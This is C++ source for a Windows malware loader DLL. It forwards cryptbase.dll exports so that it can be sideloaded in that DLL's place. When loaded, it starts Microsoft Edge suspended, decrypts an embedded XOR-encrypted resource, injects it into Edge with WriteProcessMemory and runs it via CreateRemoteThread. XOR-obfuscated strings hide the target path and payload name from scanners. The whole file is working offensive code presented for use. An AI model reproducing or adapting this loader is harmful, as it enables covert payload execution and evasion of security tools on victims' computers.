#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <thread>
#include <random>
#include <array>
#include <string>
#include "resource.h"

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:SystemFunction001=C:\\Windows\\System32\\cryptbase.SystemFunction001,@1")
#pragma comment(linker, "/export:SystemFunction002=C:\\Windows\\System32\\cryptbase.SystemFunction002,@2")
#pragma comment(linker, "/export:SystemFunction003=C:\\Windows\\System32\\cryptbase.SystemFunction003,@3")
#pragma comment(linker, "/export:SystemFunction004=C:\\Windows\\System32\\cryptbase.SystemFunction004,@4")
#pragma comment(linker, "/export:SystemFunction005=C:\\Windows\\System32\\cryptbase.SystemFunction005,@5")
#pragma comment(linker, "/export:SystemFunction028=C:\\Windows\\System32\\cryptbase.SystemFunction028,@6")
#pragma comment(linker, "/export:SystemFunction029=C:\\Windows\\System32\\cryptbase.SystemFunction029,@7")
#pragma comment(linker, "/export:SystemFunction034=C:\\Windows\\System32\\cryptbase.SystemFunction034,@8")
#pragma comment(linker, "/export:SystemFunction036=C:\\Windows\\System32\\cryptbase.SystemFunction036,@9")
#pragma comment(linker, "/export:SystemFunction040=C:\\Windows\\System32\\cryptbase.SystemFunction040,@10")
#pragma comment(linker, "/export:SystemFunction041=C:\\Windows\\System32\\cryptbase.SystemFunction041,@11")

// ---------------- XOR Runtime Key for Payload ----------------
const char encryptionKey[] = "KFHDNSAdsbadhasvdjhlvbyu2wbdBJHFSBBFWUQFBALDBAjklfdbsf2894hfb28rlbsdhjbf82";

void ProcessDataBuffer(BYTE* data, DWORD size) {
    int keyLength = sizeof(encryptionKey) - 1;
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= encryptionKey[i % keyLength];
    }
}

// ---------------- Compile-Time XOR String ----------------
template <std::size_t N, wchar_t KEY = 0x5A>
class XorStrW {
private:
    std::array<wchar_t, N> data_{};

public:
    constexpr XorStrW(const wchar_t(&str)[N]) : data_{} {
        for (std::size_t i = 0; i < N; ++i)
            data_[i] = str[i] ^ KEY;
    }

    std::wstring decrypt() const {
        std::wstring result;
        result.resize(N - 1);
        for (std::size_t i = 0; i < N - 1; ++i)
            result[i] = data_[i] ^ KEY;
        return result;
    }
};

// ---------------- Loader Function ----------------
void StartProcessTask() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Compile-time XOR path
    constexpr XorStrW<sizeof(L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe") / sizeof(wchar_t)> exePathXor(
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
    );
    std::wstring exePath = exePathXor.decrypt();

    if (!CreateProcessW(exePath.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return;
    }

    HMODULE hMod = NULL;
    if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)StartProcessTask, &hMod)) {
        return;
    }

    // Compile-time XOR resource name
    constexpr XorStrW<sizeof(L"https_enc") / sizeof(wchar_t)> resNameXor(L"https_enc");
    std::wstring resName = resNameXor.decrypt();

    HRSRC res = FindResourceW(hMod, resName.c_str(), L"DATA");
    if (!res) {
        return;
    }

    DWORD resSize = SizeofResource(hMod, res);
    HGLOBAL resData = LoadResource(hMod, res);
    void* resPtr = LockResource(resData);
    if (!resPtr || resSize == 0) {
        return;
    }

    BYTE* buffer = (BYTE*)VirtualAlloc(0, resSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!buffer) {
        return;
    }

    memcpy(buffer, resPtr, resSize);
    ProcessDataBuffer(buffer, resSize); // runtime decrypt

    LPVOID remoteBuf = VirtualAllocEx(pi.hProcess, NULL, resSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuf) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteBuf, buffer, resSize, &bytesWritten)) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    VirtualFree(buffer, 0, MEM_RELEASE);
}

// ---------------- DLL Entry ----------------
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        StartProcessTask();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
